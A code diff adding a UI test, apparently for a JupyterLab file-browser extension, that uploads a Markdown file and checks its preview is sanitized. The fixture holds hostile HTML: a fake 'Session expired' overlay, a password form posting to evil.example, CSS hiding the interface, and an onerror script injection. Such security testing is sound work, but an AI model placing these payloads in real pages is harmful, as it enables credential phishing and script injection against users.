@@ -612,6 +612,46 @@ def notebook_opened_untrusted(x: Explorer) -> None:
     x.back_to_notebook()
 
 
+# Markdown whose HTML would restyle or cover JupyterLab, or ask for a password.
+HOSTILE_MARKDOWN = """# Report
+
+<p>x</p><style>.jp-LabShell { display: none }</style>
+<div style="position: fixed; inset: 0; background: white">Session expired</div>
+<form action="https://evil.example/login"><input type="password"><button>Sign in</button></form>
+<img src="x" onerror="window.__jse_ran = true">
+
+| a | b |
+|--:|---|
+| 1 | 2 |
+"""
+
+
+@check
+def markdown_preview_sanitized(x: Explorer) -> None:
+    x.top("Scratch")
+    x.el.locator(".jse-list").evaluate(
+        """(list, text) => {
+          const data = new DataTransfer();
+          data.items.add(new File([text], "report.md", { type: "text/markdown" }));
+          for (const type of ["dragenter", "dragover", "drop"]) {
+            list.dispatchEvent(new DragEvent(type, { bubbles: true, cancelable: true, dataTransfer: data }));
+          }
+        }""",
+        HOSTILE_MARKDOWN,
+    )
+    x.button("Upload").click()
+    x.row("report.md").click()
+    x.el.locator(".jse-status-bar .jse-link").click()
+    markdown = x.preview.locator(".jse-markdown")
+    expect(markdown.locator("h1")).to_have_text("Report")
+    expect(markdown.locator("td").first).to_have_text("1")  # tables kept
+    for selector in ("style", "form", "input", "button", "[style]"):
+        expect(markdown.locator(selector)).to_have_count(0)
+    expect(x.page.locator(".jp-LabShell")).to_be_visible()
+    assert x.page.evaluate("window.__jse_ran") is None, "the file's script ran"
+    x.preview.press("Escape")
+
+
 @check
 def query_in_new_tab(x: Explorer) -> None:
     x.go("curated")
